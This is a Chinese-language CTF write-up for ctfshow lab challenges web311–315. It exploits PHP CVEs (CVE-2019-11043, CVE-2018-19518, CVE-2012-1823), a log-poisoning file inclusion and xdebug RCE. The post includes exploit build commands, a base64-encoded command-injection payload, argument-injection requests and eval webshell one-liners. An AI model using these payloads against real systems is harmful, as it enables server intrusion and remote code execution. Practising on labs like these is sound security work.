---
title: Web入门_phpCVE
author: Creexile
date: 2024-10-10 18:40:43
lastMod: 2025-04-10
summary: 'web311-315'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [PHP, 伪协议, 文件包含, RCE, PHP-CGI, CTF]
---

# phpCVE

---

> 搜索一般都是 `php/版本号 cve`或`php/版本号 漏洞`

## web311

- 描述: 似曾相识,就这一个文件，不用扫描

抓包发现提示CVE, 以及`X-Powered-By: PHP/7.1.33dev`

网上搜索, 对应的CVE为`CVE-2019-11043`, 再寻找可利用的poc

[参考1](https://blog.exsvc.cn/article/php-cve-2019-11043.html), [github_poc](https://github.com/neex/phuip-fpizdam)

> 我找到的poc好多都是基于这个写的, 这个poc需要安装go环境
>
> 他甚至给了你一个pdf详细解释这个漏洞

```bash
apt install golang
# yum install golang -y
git clone https://github.com/neex/phuip-fpizdam.git
cd phuip-fpizdam
# 国内直接用这个exp可能会无法编译通过，需要先将代理设置为国内代理
go env -w GOPROXY=https://goproxy.cn
go get -v && go build
# 编译完成后执行，注意地址后必须加 index.php
go run . "https://23072827-c4c4-4285-ace5-7cce969a1d98.challenge.ctf.show/index.php"
```

![image-20241010164353411](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241010164353411.png)

在URL后加上`/index.php/?a=ls` 多请求几次, 不是每次都能成功:

可以得到当前目录下`fl0gHe1e.txt`, 修改为`/index.php/?a=cat%20fl0gHe1e.txt`即可

## web312

- 描述: 你懂的

抓包得到返回包提示`X-Powered-By: PHP/5.6.38`

利用该关键词搜索漏洞, 得到: PHP imap远程命令执行漏洞(`CVE-2018-19518`)

[github\_漏洞介绍](https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518), 结合这个就可以轻松拿到shell

生成payload:

```php
<?php
$a= base64_encode('<?php @eval($_POST[1]);?>');
echo base64_encode("echo $a | base64 -d >/var/www/html/1.php")
?>
# x+-oProxyCommand%3decho%09ZWNobyBQRDl3YUhBZ1FHVjJZV3dvSkY5UVQxTlVXekZkS1RzL1BnPT0gfCBiYXNlNjQgLWQgPi92YXIvd3d3L2h0bWwvMS5waHA=|base64%09-d|sh}
```

利用payload即可

```
1=system('tac ctfshowfl4g');
```

![image-20241010172405280](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241010172405280.png)

## web313

- 描述: 你懂的

抓包得到返回包提示`X-Powered-By: PHP/5.4.1`

搜索得到 PHP-CGI远程代码执行`CVE-2012-1823`, 测试一下

```
-c 指定php.ini文件的位置
-n 不要加载php.ini文件
-d 指定配置项
-b 启动fastcgi进程
-s 显示文件源码
-T 执行指定次该文件
-h和-？ 显示帮助
```

访问`/?-s`, 发现确实返回了源码

可以利用远程包含一个木马文件, 这里尝试写个马

```
# GET:
/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
# 直接写在下面
<?php file_put_contents("1.php",'<?php eval($_POST[1]);?>');?>
```

结果 Permission denied in php://input, 拉倒了

那就直接执行命令试试, 发现是可以执行的

```php
<?php system("ls");?>
```

![image-20241010181453690](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241010181453690.png)

那就找flag, 最后在`/somewhere/fla9.txt`中找到, POC:

```php
<?php system("cat /somewhere/fla9.txt");?>
```

## web314

- 描述: 严格说算不上cve

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

//phpinfo
$file = $_GET['f'];

if(!preg_match('/\:/',$file)){
    include($file);
}
```

提示phpinfo, 访问`phpinfo.php`, 发现可以包含

过滤冒号, 那就用剩下的包含方式: 日志包含, 利用session.upload_progress文件包含

就用日志包含了:

wappalyzer查看架构, 发现是Nginx服务器, 默认日志文件为`/var/log/nginx/access.log`, 尝试访问`/?f=/var/log/nginx/access.log`, 发现是可以访问的

在UA头中写入一句话木马, 然后交给蚁剑

```php
<?php @eval($_POST[1])?>
```

![image-20241010182803263](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241010182803263.png)

最后在根目录下的fl6g得到flag

所以也可以直接POST传入

```
1=system('cat /fl6g');
```

## web315

- 描述: debug开启，端口9000

[github\_漏洞介绍](https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce)

那就是纯纯的脚本小子, 这里面也有相关使用方法, 我不多赘述

再贴一个看不太懂的文章: https://blog.csdn.net/weixin_33277215/article/details/116468944
